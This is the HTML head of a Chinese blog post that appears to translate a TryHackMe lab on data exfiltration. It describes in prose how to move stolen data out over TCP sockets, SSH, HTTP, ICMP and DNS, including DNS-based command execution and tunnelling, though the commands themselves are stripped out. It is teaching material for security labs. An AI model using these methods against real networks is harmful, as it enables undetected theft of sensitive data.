<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>THM-数据泄露 | hybcx</title><meta name="keywords" content="TryHackMe"><meta name="author" content="hybcx,19815455497@163.com"><meta name="copyright" content="hybcx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="THM-数据泄露"><meta name="application-name" content="THM-数据泄露"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="THM-数据泄露"><meta property="og:url" content="http://hybcx.xyz/2024/07/20/thm-shu-ju-xie-lu/index.html"><meta property="og:site_name" content="hybcx"><meta property="og:description" content="0x01 介绍 欢迎来到数据泄露 网络犯罪分子出于不同目的对公司使用各种互联网攻击。在大多数情况下，许多攻击都会导致数据泄露，威胁行为者窃取敏感数据并在暗网上出售或在线发布。 有人可能会问：威胁行为者如何将窃取的数据从公司网络转移到外部（也称为数据泄露）而不被发现？答案各不相同。威胁行为者可以执行多"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta property="article:author" content="hybcx"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta name="description" content="0x01 介绍 欢迎来到数据泄露 网络犯罪分子出于不同目的对公司使用各种互联网攻击。在大多数情况下，许多攻击都会导致数据泄露，威胁行为者窃取敏感数据并在暗网上出售或在线发布。 有人可能会问：威胁行为者如何将窃取的数据从公司网络转移到外部（也称为数据泄露）而不被发现？答案各不相同。威胁行为者可以执行多"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://hybcx.xyz/2024/07/20/thm-shu-ju-xie-lu/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?d98ea8480e5ec98a243adfc7bd46b93a";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = {
  linkPageTop: {"enable":true,"title":"向✌们无限学习","addFriendPlaceholder":"昵称（请勿包含博客等字样）：\n网站地址（要求博客地址，请勿提交个人主页）：\n头像图片url（请提供尽可能清晰的图片，我会上传到我自己的图床）：\n描述：\n站点截图（可选）：\n"},
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: {"enable":true,"ck":"3JLPGIZJOJw6Nvu2","LingQueMonitorID":"3JLPOLHV5W6IAty5"},
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: {"appId":"Z7A3XW4R2I","apiKey":"12db1ad54372045549ef465881c17e743","indexName":"my-hexo-blog","hits":{"per_page":6},"languages":{"input_placeholder":"输入关键词后按下回车查找","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    simplehomepage: false,
    post: true
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: hybcx","link":"链接: ","source":"来源: hybcx","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'hybcx',
  title: 'THM-数据泄露',
  postAI: '',
  pageFillDescription: '0x01 介绍, 欢迎来到数据泄露, 学习目标, 房间先决条件, 0x02 网络基础设施, 部署虚拟机！, 实验室推荐, 0x03 数据泄露, 什么是数据泄露, 如何使用数据渗透, 传统数据泄露, C2 通讯, 隧道技术, 0x04 TCP socket 进行渗透, 0x05 SSH 进行渗透, 0x06 HTTP(S) 进行渗透, HTTP POST 请求, HTTP 数据泄露, HTTPS 通讯, HTTP 隧道, 0x07 使用 ICMP 渗透, ICMP 数据部分, ICMP 数据泄露, ICMP C2 通信, 0x08 DNS 配置, 新攻击机, 用于 DNS 渗透的名称服务器, 实验室建议, DNS测试, 0x09 用 DNS 进行渗透, 什么是 DNS 数据渗透, 什么时候需要使用 DNS 数据过滤？, 修改DNS记录！, DNS 数据泄露, 通过 DNS 的 C2 通信, 0x11 DNS 隧道, DNS 隧道 (TCPoverDNS), 0x011 结论, 例子, 其他资源介绍欢迎来到数据泄露网络犯罪分子出于不同目的对公司使用各种互联网攻击在大多数情况下许多攻击都会导致数据泄露威胁行为者窃取敏感数据并在暗网上出售或在线发布有人可能会问威胁行为者如何将窃取的数据从公司网络转移到外部也称为数据泄露而不被发现答案各不相同威胁行为者可以执行多种技术包括数据泄露数据泄露是一种非传统方法用于将数据从受感染的计算机复制和传输到攻击者的计算机数据渗漏技术用于模拟正常的网络活动它依赖于等网络协议通过常见协议进行的数据渗漏很难检测和区分合法流量和恶意流量某些协议并非旨在通过其传输数据然而威胁行为者找到了滥用这些协议来绕过基于网络的安全产品例如防火墙的方法作为红队成员使用这些技术对于避免被发现至关重要学习目标该室介绍了数据泄露类型并展示了用于通过各种协议传输数据的技术什么是数据泄露了解数据泄露类型及其使用方式通过协议进行数据泄露和通过各种协议练习通信练习通过和建立隧道房间先决条件介绍性网络协议和服务器详细信息使用或类似工具对于单次登录的多个会话网络基础设施对于这个房间我们构建了一个网络来模拟实际场景我们可以使用各种网络协议执行数据泄露和隧道传输提供的虚拟机包含两个具有多个客户端的独立网络我们还有一台机器可以访问这两个网络下图显示了有关该房间使用的网络环境的更多信息简单拓扑图如下在接下来的各种协议任务中请使用网络图作为参考我们还设置了域名以方便在网络环境内进行通信和连接请查看下表了解有关该房间使用的域名和网络访问的更多信息部署虚拟机通过部署或连接到部署提供的并通过客户端连接到它使用以下凭据连接到可访问内部网络的计算机连接到计算机后您就可以访问这两个网络检查网络基础设施以获取更多信息实验室推荐我们建议对大多数任务使用和网络环境以避免和网络出现技术问题但是如果您更愿意使用执行隧道任务任务则必须将的设置更改为有关更改的的更多信息请检查配置任务大多数情况下我们需要使用两台机器建立通信因此我们需要两个或更多可用的终端来完成任务因此我们建议使用工具通过单个登录创建多个会话数据泄露什么是数据泄露数据泄露是获取未经授权的敏感数据副本并将其从组织网络内部移动到外部的过程值得注意的是数据泄露是一个受损后的过程其中威胁参与者已经获得了网络访问权限并执行了各种活动来获取敏感数据数据泄露通常发生在网络杀伤链模型的最后阶段即目标行动数据泄露还用于隐藏对手的恶意活动并绕过安全产品例如渗透技术可以逃避安全产品例如防火墙敏感数据可以有多种类型和形式并且可能包含以下内容用户名和密码或任何身份验证信息银行账户详细信息业务战略决策加密密钥员工和人事信息项目代码数据如何使用数据渗透数据泄露有三种主要用例场景包括窃取数据命令和控制通信隧道技术传统数据泄露通讯许多框架提供了建立通信通道的选项包括用于发送命令和接收来自受害计算机的响应的标准和非传统协议在通信中攻击者发送请求以在受害者的计算机中执行命令的请求数量有限然后代理的客户端执行命令并通过非传统协议发送包含结果的回复通信将朝两个方向进行进出网络隧道技术在隧道场景中攻击者使用这种数据泄露技术在受害者和攻击者的计算机之间建立通信通道通信通道充当桥梁让攻击者机器访问整个内部网络建立连接时将持续发送和接收流量在接下来的任务中我们将讨论以下技术和用例使用和进行渗透使用进行渗透使用进行渗透请求进行渗透此任务展示如何使用数据编码通过窃取数据使用是攻击者在知道没有基于网络的安全产品的非安全环境中可能使用的数据泄露技术之一如果我们处于安全良好的环境中那么不建议进行这种渗透这种渗透类型很容易检测因为我们依赖非标准协议除了套接字之外我们还将使用各种其他技术包括数据编码和归档这项技术的好处之一是它在传输过程中对数据进行编码使其更难以检查下图解释了上的传统通信的工作原理如果两台机器想要通信那么其中一台必须侦听并等待传入流量这类似于两个人交谈和交流的方式其中一个人在听另一个人在说话该图显示两台主机通过在端口上进行通信步骤如下第一台机器正在通过侦听端口另一台机器连接到步骤中指定的端口例如第一台机器建立连接最后开始发送和接收数据例如攻击者发送命令并接收结果通过的通信需要两台机器一台受害者机器和一台攻击者机器来传输数据让我们使用我们的网络环境来练习通过发送数据为了通过建立通信我们需要两台机器机器是受害者而是攻击者机器首先我们需要在您指定的端口上的上准备一个侦听器在我们的例子中我们选择端口在上一个命令中我们使用命令在端口上接收数据然后一旦接收到数据我们将其存储在目录中并将其命名为作为文件名现在让我们使用以下凭据连接到包含需要传输的数据的受害者计算机请注意要从连接到我们可以使用内部域名如下所示我们还可以使用端口直接从连接如下所示我们已准备好在受害计算机上传输所需的数据在本例中我们有一个包含几个凭据的示例文件检查受害计算机上的文件现在我们有了凭证文本文件我们将使用套接字来窃取它确保侦听器正在上运行让我们分解前面的命令并解释它我们使用命令创建一个存档文件其中包含秘密目录内容的参数用于使用压缩所选文件夹用于创建新存档用于使用存档文件然后我们将创建的文件传递给命令以将其转换为表示形式然后我们将命令的结果传递给使用编码数据的命令来创建和复制备份文件最后我们重定向命令的输出以使用指定和端口在本例中为端口上的套接字传输它请注意我们在渗透过程中使用了和编码来保护数据如果有人检查流量它将采用非人类可读的格式并且不会泄露传输的文件类型一旦我们按下回车键我们应该会在目录中收到编码数据在上我们需要将接收到的数据转换回其原始状态我们将使用工具将其转换回来恢复文件以下是对上一条命令的解释我们使用命令将接收到的文件转换为表示形式我们使用作为命令的输入命令的输出将传递到以使用参数进行解码最后我们将输出保存在文件中接下来我们需要使用命令解压文件并检查内容如下让我们分解前面的命令并解释它我们使用命令使用参数来解压缩文件用于提取文件用于详细列出文件用于使用存档文件现在让我们确认我们从受害机器获得了相同的数据成功在此任务中我们使用套接字将数据从受害者计算机窃取到攻击者计算机进行渗透在此任务中我们将展示如何使用协议将数据泄露到攻击计算机协议建立了一个安全通道来在客户端和服务器之间交互和移动数据因此所有通过网络或传输的数据都是加密的要通过传输数据我们可以使用安全复制协议或客户端假设我们没有可用于通过传输数据的命令因此在此任务中我们将更多地关注客户端正如我们之前提到的攻击者需要控制服务器在本例中启用了服务器来接收泄露的数据因此在此场景中我们将使用作为服务器您还可以使用因为它启用了服务器假设我们已经获得了对必须安全传输的敏感数据的访问权限让我们连接到或机器需要传输的数据让我们使用我们在使用套接字进行渗透任务中讨论的相同技术其中我们将使用命令来归档数据然后传输它从机器中泄露数据让我们分解前面的命令并解释它我们和上一个任务一样使用命令创建目录的归档文件然后我们通过传递存档文件客户端提供了一种无需完整会话即可执行单个命令的方法我们传递了必须在双引号中执行的命令在这种情况下我们更改目录并取消归档传递的文件如果我们检查攻击者的机器我们可以看到我们已经成功传输了文件进行渗透在进一步进行之前请确保您在深入研究此任务和即将到来的任务之前具备网络协议的基础知识此任务说明如何使用协议将数据从受害者窃取到攻击者的计算机作为此技术的要求攻击者需要控制安装并启用服务器端编程语言的网络服务器我们将在本任务中展示基于的场景但它可以用任何其他编程语言实现例如等请求通过协议泄露数据是最好的选择之一因为检测起来很困难区分合法和恶意流量很困难我们将在数据泄露中使用方法原因是使用请求时所有参数都会注册到日志文件中使用请求时则不然以下是方法的一些优点请求永远不会被缓存请求不会保留在浏览器历史记录中请求无法添加书签请求对数据长度没有限制让我们使用凭据登录到计算机并使用两个请求一个用于另一个用于检查日志文件并检查它们的外观显然第一行是一个带有泄露数据的文件参数的请求如果您尝试使用编码对其进行解码您将获得传输的数据在本例中为虽然第二个请求是对的但我们发送了相同的数据但它没有显示传输的数据中的数据看起来有所不同不是吗对其进行解码以找到下面问题的标志在典型的现实场景中攻击者控制互联网上某处云中的服务器从受感染的计算机执行代理或命令将受感染计算机网络外部的数据通过发送到服务器然后攻击者就可以登录服务器来获取数据如下图所示数据泄露根据攻击者的配置我们可以设置或的加密版本我们还需要一个页面来处理发送到服务器的请求我们将在我们的场景中使用协议而不是现在假设攻击者控制了服务器并且敏感数据必须从我们的网络环境中的或计算机发送要通过协议窃取数据我们可以应用以下步骤攻击者使用数据处理程序设置服务器在我们的例子中它将是和页面作为数据处理程序代理或攻击者发送数据在我们的例子中我们将使用命令发送数据网络服务器接收数据并存储它在我们的例子中接收请求并将其存储到中攻击者登录网络服务器以获取收到的数据的副本让我们遵循并应用我们在前面的步骤中讨论的内容请记住由于我们使用协议因此数据将以明文形式发送但是我们将使用其他技术和来更改数据的字符串格式使其不再是人类可读的格式首先我们为此任务准备了一个带有数据处理程序的网络服务器以下代码快照是代码用于通过文件参数处理请求并将接收到的数据以文件名存储在目录中现在从计算机上通过连接到计算机以通过协议窃取所需的数据使用以下凭据您还可以使用端口从连接到它如下所示目标是通过协议将存储在中的文件夹内容传输到另一台计算机现在我们有了数据我们将使用命令发送一个请求其中包含秘密文件夹的内容如下所示我们使用带参数的命令通过文件参数发送请求请注意我们使用命令创建了秘密文件夹的存档文件我们还将命令的输出转换为表示形式接下来从或机器上登录到网络服务器并检查目录是否已成功传输所需的数据使用以下凭据登录网络好的我们已经收到了数据但是如果您仔细查看文件您会发现它的已损坏发生这种情况是由于上的编码所致符号已被替换为空格因此让我们使用命令修复它如下所示是一个流编辑器用于对文本文件进行基本的文本操作如查找替换插入和删除等选项表示就地编辑文件使用这个选项后会直接修改文件而不是将结果输出到标准输出这是一个替换命令格式为表示替换表示要查找的模式这里是一个空格字符表示替换的模式这里是一个加号全局替换标志表示替换行内所有符合模式的部分如果省略只会替换每行第一个符合模式的部分综上所述的含义是将每行中的所有空格替换为加号使用命令我们将空格替换为字符使其成为有效的字符串最后我们使用带参数的命令对字符串进行解码然后传递解码后的文件并使用命令将其取消归档通讯在上一节中我们展示了如何通过协议执行数据过滤这意味着所有传输的数据都是明文形式的优点之一是使用服务器上存储的密钥对传输的数据进行加密如果您应用我们之前在启用的服务器上展示的相同技术那么我们可以看到所有传输的数据都将被加密我们已经设置了私有服务器来显示传输的数据如果您有兴趣设置自己的服务器我们建议您访问网站如屏幕截图所示我们捕获了网络流量似乎端口上的所有客户端和服务器通信都已加密隧道协议隧道技术封装了其他协议并通过协议来回发送它们隧道根据通信通道发送和接收许多请求在深入研究隧道细节之前我们先讨论一个无法通过访问许多内部计算机的典型场景例如在我们的场景中服务器可通过访问并向每个人提供服务但服务器运行在本地只为内网提供服务如下图所示在本节中我们将创建一个隧道通信通道以进入内部网络并通过协议与本地网络设备进行通信假设我们发现了一个网络应用程序可以让我们将隧道代理文件上传到受害者网络服务器上传并连接到它后我们将能够与进行通信对于隧道我们将使用工具建立通信通道来访问内部网络设备我们已经在中安装了该工具我安装在上了接下来我们需要生成一个加密的客户端文件并将其上传到受害者的服务器如下所示前面的命令使用目录中的密钥生成加密的隧道客户端请注意有各种可用的扩展包括等在我们的场景中我们将通过上传器计算机上传文件要访问上传器机器您可以访问以下或无需要上传文件请使用作为密钥以便您将任何文件上传到上传文件后我们可以通过以下访问它我们需要使用连接到客户端并提供解密隧道客户端的密钥我们还需要提供我们在上传机器上上传的文件的一旦连接到隧道客户端我们就可以使用隧道连接作为本地计算机上的代理绑定端口上的例如如果我们要访问其内部地址为端口为我们可以使用带有参数的命令我们还可以使用其他代理应用程序例如等来与内部网络进行通信下图显示了流量通过上传机器然后与内部网络设备在本例中为应用程序机器通信的情况请注意如果我们检查来自机器的网络流量我们会看到传入流量的源地址来自上传者机器现在复制隧道步骤通过协议建立隧道以作为端口上的地址与进行通信请注意如果您从同一网络内的其他计算机访问网站网络你不会得到标志使用渗透在此任务中我们将展示如何使用协议窃取数据代表互联网控制消息协议它是用于处理错误报告的网络层协议如果您需要有关和计算机网络基础知识的更多信息您可以访问以下室什么是网络路由器等网络设备使用协议来检查设备之间的网络连接请注意协议不是在设备之间发送数据的传输协议假设两台主机需要测试网络中的连通性然后我们可以使用命令通过网络发送数据包如下图所示发送带有回显请求数据包的数据包然后如果可用它会发回一个数据包其中包含确认可用性的回显应答消息数据部分在较高级别上数据包的结构包含一个数据部分其中可以包含字符串或其他信息的副本例如用于错误消息的标头下图显示了数据部分该部分是可选使用的请注意数据字段是可选的可以为空也可以在通信期间包含随机字符串作为攻击者我们可以使用结构将我们的数据包含在数据部分中并通过数据包将其发送到另一台机器另一台机器必须捕获带有数据包的网络流量才能接收数据要执行手动数据过滤我们需要更多地讨论命令命令是任何操作系统中都可用的网络管理员软件它用于通过发送数据包来检查可达性和可用性可以如下使用我们选择使用上一个命令中的参数从主机我们的发送一个数据包到主机目标机器现在让我们检查中的数据包看看数据部分是什么样的截图显示数据部分已被随机字符串选中需要注意的是此部分可能填充了需要传输到另一台机器的数据操作系统中的命令有一个有趣的选项使用参数我们可以以十六进制表示形式指定要通过数据包发送的字节数据请注意选项仅适用于操作系统我们可以通过查看的帮助手册页来确认假设我们需要窃取以下凭据首先我们需要将其转换为十六进制表示形式然后使用选项将其传递给命令如下所示是一个十六进制编辑器它可以将二进制数据转换为十六进制表示或者将十六进制表示转换回二进制数据的选项表示以纯十六进制字符输出即每个字节用两个十六进制字符表示并且输出中不包含额外的信息如偏移量或表示我们使用命令将字符串转换为十六进制然后我们可以使用命令以及转换得到的十六进制值我们使用命令和数据发送了一个数据包让我们看看中该数据包的数据部分出色的我们已经成功地用我们的数据填充了的数据部分并使用命令通过网络手动发送它数据泄露现在我们已经掌握了通过数据包手动发送数据的基本原理接下来我们讨论如何使用来窃取数据框架使用上一节中解释的相同技术但是它将捕获传入的数据包并等待文件开始触发值一旦收到它就会写入磁盘直到获得文件结束触发值下图显示了框架所需的步骤由于我们需要框架来实现此技术因此我们需要机器才能成功执行此攻击现在在中我们通过选择模块来设置框架使其准备好捕获和侦听流量该模块的要求之一是设置基于规则的选项以仅捕获数据包并忽略任何具有攻击机器源的数据包如下所示我们还需要选择要监听的网络接口但我这里是最后执行来启动模块我们准备了作为受害者机器使用所需的工具完成任务从中使用凭据登录到我们预装了工具这是一个用于网络数据包生成响应分析和响应时间测量的开源工具工具是套件工具的一部分首先我们将从机器发送触发器以便框架开始写入磁盘我们使用带有参数的命令发送了一个数据包我们使用文件名指定触发器值该文件名是框架中默认设置的如果需要可以从更改此设置现在检查终端如果一切设置正确框架应该识别触发器值并等待数据写入磁盘让我们开始从机器发送所需的数据和文件结束触发值发送完数据和结束触发值后让我们检查一下好的我们已经使用框架成功通过协议传输数据您可以检查终端中提到的战利品文件来确认收到的数据通信接下来我们将展示使用工具通过协议执行命令是一个用和编写的开源反向该工具使用我们在本任务前面讨论的相同概念其中攻击者利用数据包中的数据部分唯一的区别是攻击者发送需要在受害者机器上执行的命令一旦命令被执行受害机器就会在数据部分的数据包中发送执行输出我们已经准备好了在和主机上通过协议进行通信所需的工具首先我们需要登录到机器并执行二进制文件如下所示请注意我们指定了通信的接口以及服务器端的目标接下来登录到并执行二进制文件以与受害者我们的主机进行通信一旦执行正确运行就会通过协议建立通信通道现在我们准备发送需要在受害机器上执行的命令与客户端二进制文件类似确保选择通信接口以及目标正如前面的终端所示我们请求执行命令并且收到了为了确认所有通信都经过协议我们使用捕获通信过程中的网络流量如下所示配置通过协议进行渗透需要控制域名并设置记录包括或因此我们提供了一个界面方便您添加和修改记录以下域名已设置并准备好执行渗透任务要访问该网站您可以访问以下链接或无需选择域名后您可以添加记录并测试并在出现问题时重置配置新攻击机请注意我们在网络中添加了一台新的攻击者机器该机器具有以下子域名和地址我们将使用攻击者机器在和隧道场景中进行渗透主要目标是攻击者机器在上可以通过访问网络的内部网络设备用于渗透的名称服务器为了在所提供的网络或互联网上成功执行渗透我们需要为我们控制的域名设置一个名称服务器如下所示添加指向的地址的记录例如添加一条记录将查询路由到步骤中的记录例如确保我们为值指定完整域名添加两条记录后名称服务器就可以用于过滤目的如果您选择不设置我们会在我们提供的网络中为攻击者计算机设置一个名称服务器并且可以按如下方式使用请注意地址指向我们网络中新添加的攻击者计算机并且它已准备好在我们的环境中和攻击者之间用于任务和目的实验室建议尽管您可以在该房间中使用但我们建议对大多数部分使用以避免和网络方面的技术问题如果您更喜欢使用执行隧道任务任务则必须将的设置更改为有多种方法可以更改计算机中的设置然而以下是我们为我们的环境找到的稳定解决方案之一首先我们需要编辑配置文件修改配置文件在接口下添加部分如下最后应用更改这可能需要运行两次测试一旦您可以访问机器您需要通过如下测试来确保正常工作服务器必须将和域名解析为确认您已准备就绪用进行渗透协议是一种通用协议其主要目的是将域名解析为地址反之亦然尽管协议不是为传输数据而设计的但威胁参与者找到了一种滥用和通过其移动数据的方法此任务展示了一种通过协议窃取数据的技术什么是数据渗透由于不是传输协议因此许多组织不会定期监控协议任何组织网络中的几乎所有防火墙都允许使用协议出于这些原因威胁行为者更喜欢使用协议来隐藏他们的通信协议有需要考虑的局限性如下所示完全限定域名包括分隔符的最大长度为个字符子域名标签长度不得超过个字符不包括等基于这些限制我们可以使用有限数量的字符通过域名传输数据如果我们有一个大文件例如可能需要超过个请求才能完整传输该文件因此它将是嘈杂的交通并且容易被注意到和检测现在我们来讨论一下通过进行数据泄露的要求和步骤如下攻击者注册域名例如攻击者将的记录设置为指向攻击者控制的服务器恶意软件或攻击者将敏感数据从受害者计算机发送到他们控制的域名例如其中是需要传输的数据请求通过本地服务器发送并通过转发攻击者的权威恶意服务器收到请求最后攻击者从域名中提取密码什么时候需要使用数据过滤有许多用例场景但典型的场景是防火墙阻止并过滤所有流量我们可以使用协议通过防火墙传递数据或数据包但重要的是要确保允许并将域名解析为地址修改记录现在让我们尝试在提供的网络环境中执行数据过滤请注意在此场景中我们将使用域名我们还提供了一个界面来修改的记录以插入指向您的计算机的名称服务器确保完成任务中的这些设置数据泄露现在让我们解释手动数据过滤技术并展示其工作原理假设我们有包含敏感数据例如信用卡信息的文件要通过协议移动它我们需要对文件的内容进行编码并将其附加为子域名如下所示获取需要传输的所需数据使用其中一种编码技术对文件进行编码将编码字符作为子域标签发送考虑协议的限制请注意我们可以向域名添加尽可能多的数据但整个必须保持在个字符以内每个子域标签不能超过个字符如果我们确实超出了这些限制我们将分割数据并发送更多请求现在让我们尝试在提供的网络环境中执行数据过滤技术本节旨在将文件的内容从受害者传输到攻击者我们将使用名称服务器指向新添加的计算机攻击者计算机重要提示您可以使用来执行此任务但请确保更新记录并添加指向的地址的记录或使用攻击者计算机的预配置名称服务器首先要做的是让攻击者机器准备好接收任何请求让我们通过连接到攻击者计算机这可以使用以下凭据从完成或者从机器使用和端口如下所示为了接收任何请求我们需要使用工具捕获任何传入数据包的网络流量一旦攻击者机器准备就绪我们就可以进入下一步即通过连接到受害者这可以使用以下凭据从完成或者从机器使用和端口如下所示在机器上有一个包含虚拟数据的文件为了发送文件的内容我们需要将其转换为字符串表示形式这可以使用任何编码表示形式例如十六进制二进制等来完成在我们的示例中我们使用对文件进行编码如下所示现在我们有了表示形式我们需要根据输出的长度限制将其拆分为一个或多个请求并将其附加为子域名让我们从拆分多个请求开始展示这两种方法这里是系统中的一个转换工具可以实现删除替换压缩等字符串转换操作参数表示删除表示换行符所以整条命令的作用是删除输入内容中的所有换行符也就是将输入的多行文本压缩成一行在上述示例中我们先用对数据进行编码然后再用命令来删除编码后的换行符这可以起到压缩数据增加传输效率的目的因为编码会让数据大小增大因此删除换行符可以缩小数据量有利于数据传输同时也增加了数据的混淆性让查看者难以识别将编码后的字符串折行每行个字符以伪装成普通文本表示使用扩展正则表达式在中正则表达式可以分为基本正则表达式和扩展正则表达式默认使用的是基础正则表达式语法比较简单只支持部分元字符和字符类而扩展正则表达式则支持更复杂和高级的正则语法命令后面的格式是正则表达式替换字符串其中正则表达式部分表示匹配输入行的全部内容替换字符串部分表示正则表达式匹配到的内容即输入行的全部后面添加了字符串在上一个命令中我们读取文件的内容并使用对其进行编码然后我们通过删除新行来清理字符串并将每个字符收集为一组最后我们为每个组附加了名称服务器让我们检查一下发送单个请求的另一种方式我们将使用该方式进行数据泄露这次我们用点分割每个字符并添加名称服务器类似于我们在上一个命令中所做的操作在每行末尾追加再次删除换行符压缩数据在压缩后的字符串末尾追加此处使用了命令的替换功能其中表示替换表示行尾接下来从机器上考虑限制我们将数据作为子域名发送如下所示命令会对输入内容的每一行进行逐行处理是处理动作打印字符串拼接当前行的第一个字段也就是域名这样的输出就是一系列命令使用管道将的输出作为命令来执行这样就实现了自动提取域名构造命令执行这些命令实现域名解析通过对单个请求进行一些调整我们创建并添加了命令以通过发送它最后我们将其传递给来执行如果我们检查攻击者的终端我们应该会收到从受害者发送的数据一旦收到我们的请求我们可以停止工具并通过删除不需要的字符串来清理接收到的数据最后使用解码回数据如下所示表示使用点号作为分隔符提取输入文本的前个字段具体来说指定了分隔符为点号指定了要提取的字段这里是即前个字段所以这条命令的作用就是对于以点号分隔的输入文本提取每行的前个字段在上述示例中前八个字段对应的是表示删除输入内容中的所有点符号表示对输入内容进行解码处理总结通过和三个命令的组合实现了分割去点号和解码的效果好的我们已成功通过协议手动传输的内容通过的通信框架使用协议进行通信例如通过协议发送命令执行请求和接收执行结果他们还使用记录运行在受害计算机上下载额外文件本节模拟如何通过协议执行脚本我们将使用界面将记录添加到域名例如假设我们有一个需要在受害计算机上执行的脚本首先我们需要将脚本编码为表示形式然后使用编码脚本的内容创建您控制的域名的记录以下是需要添加到域名的所需脚本示例该脚本在受害计算机中执行命令并向发送一个数据包请注意该脚本只是一个示例可以替换为任何内容现在使用您最喜欢的文本编辑器将脚本保存到然后使用对其进行编码如下所示现在我们有了脚本的表示形式我们将其作为记录添加到我们控制的域中在本例中为您可以通过我们提供的界面或添加它而无需使用添加后我们通过请求本地服务器解析的记录来确认我们已成功创建脚本的记录如果一切设置正确我们应该会收到上一步中添加的内容我们使用命令来检查我们在上一步中添加的记录的记录结果我们可以在回复中获取我们脚本的内容现在我们确认了记录我们执行如下请注意我们在使用执行脚本并删除任何双引号之前清理了输出然后我们使用解码文本表示最后将内容传递给命令来执行现在复制通信步骤来执行记录的内容并回答以下问题隧道此任务将展示如何通过协议创建隧道确保您理解上一个任务通过的中讨论的概念因为隧道工具基于相同的技术工作隧道此技术也称为其中攻击者使用数据渗透技术通过协议封装其他协议例如请求隧道建立了一个连续发送和接收数据的通信通道本节将介绍通过建立通信通道所需的步骤我们将该技术应用于我们提供的网络基础设施和以从网络转移到网络并访问内部服务器有关网络基础设施的更多信息请查看任务我们将使用工具来创建隧道通信请注意我们已经在和机器上安装了要建立隧道我们需要执行以下步骤确保更新记录并创建指向计算机的新点检查任务或者您可以使用预配置的名称服务器该服务器指向攻击者计算机从或攻击者机器运行服务器注意服务器端我们使用在上运行客户端来建立连接请注意对于客户端我们使用不含通过连接到已创建网络接口上的计算机以通过创建代理我们将使用参数来创建动态端口转发一旦建立了连接我们就可以在或中使用本地和本地端口作为代理让我们按照步骤创建隧道首先让我们运行服务器端应用程序如下所示让我们进一步解释一下前面的命令确保使用执